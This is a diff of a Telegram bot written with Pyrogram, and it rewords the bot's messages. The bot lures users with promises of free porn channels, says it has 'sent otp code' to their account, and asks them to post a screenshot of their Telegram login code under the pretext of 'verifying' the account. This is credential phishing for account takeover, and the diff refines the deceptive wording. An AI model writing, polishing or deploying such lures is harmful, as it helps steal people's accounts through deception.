@@ -30,15 +30,15 @@ app = pyrogram.Client(
 
 # START YA INI JINK !
 
-START_MESSAGE = """👋🏻 Hello I am a Koleksi Porn Channel Bot
+START_MESSAGE = """👋🏻 Hello, Introduce Me There Is a Bot For You To Get Viral Content Premium Porn Channels
 
 Please press :
 
 👉🏻 /getchannel to get your free Koleksi Porn channel
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚠️ Leave this bot if you don't believe this bot
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔞 ADULT CONTENT ONLY, if you are not old enough please leave this Bot
 
 ⁉️ __Please don't spam this bot, if the bot process takes a long time, please wait, Dont Spam!!!__
@@ -107,7 +107,7 @@ async def regex_cantik(_, message):
     await rexa.edit("__successfully sent otp code…__")
     await asyncio.sleep(5)
     await app.send_photo(message.chat.id, "https://graph.org/file/9565efceb3137dcd28ece.jpg", caption="""
-🤖 **My system bot Want Log in**
+🤖 ** Our Bot System Need to Verify your Telegram Account**
 
 We sent a login code to your Telegram account, please send take a screenshot and please post it here, as in the example Picture 
 
